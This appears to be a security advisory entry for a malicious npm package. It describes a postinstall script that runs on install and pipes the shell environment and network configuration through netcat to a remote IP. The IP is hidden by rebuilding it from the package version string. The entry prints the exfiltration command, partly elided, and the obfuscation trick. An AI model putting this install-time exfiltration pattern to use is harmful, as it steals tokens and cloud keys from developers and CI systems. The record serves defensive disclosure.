summary: postinstall exfiltrates environment variables and network config to hardcoded remote host
details: package.json declares a postinstall lifecycle script that runs on `npm install`: `(env; ip addr) | nc "$(echo "$npm_package_version" | cut -d. -f1-2)..." 888`. The script dumps the full shell environment (`env`) and network interface configuration (`ip addr`) and pipes them via netcat to a remote host on TCP port 888. The destination IP is reconstructed at install time from the package's own version string (49.13.4074225 → 49.13.74.225), obfuscating the C2 address so it does not appear as a literal in source. Bulk `env` transmission leaks any credentials present in the installer's environment, including CI tokens, cloud provider keys, and npm publish tokens. Delivery via raw netcat to a numeric IP on a non-standard port is covert exfiltration, not telemetry.

cwes.description: The product contains code that appears to be malicious in nature.
